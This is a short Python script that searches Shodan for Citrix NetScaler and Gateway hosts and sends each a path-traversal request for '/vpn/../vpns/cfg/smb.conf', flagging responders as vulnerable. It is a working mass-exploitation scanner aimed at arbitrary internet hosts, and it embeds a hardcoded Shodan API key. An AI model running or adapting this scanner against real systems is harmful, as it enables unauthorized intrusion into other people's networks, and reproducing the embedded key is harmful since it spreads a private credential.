import requests
from shodan import Shodan
from colorama import Fore, Style

api = Shodan("G8s39IzbLuHRjdDQERtt7oUCQFSFd10Y")
citrixQuery = ['Netscaler', 'Netscaler AAA', 'Netscaler Gateway', 'Citrix Gateway']


def verify(ip):
    try:
        r = requests.get('https://{}/vpn/../vpns/cfg/smb.conf'.format(ip), verify=False, timeout=0.5)
        if r.status_code == 200:
            print(Fore.GREEN+"[+] VULNERABLE -> {}".format(ip))
        else:
            pass
        print(Style.RESET_ALL)

    except:
        pass
def getIp():
    try:
        for banner in api.search_cursor('Netscaler'):
            ips = banner['ip_str']
            ips = [ips]
            for i in ips:
                verify(i)
    except:
        pass
getIp()
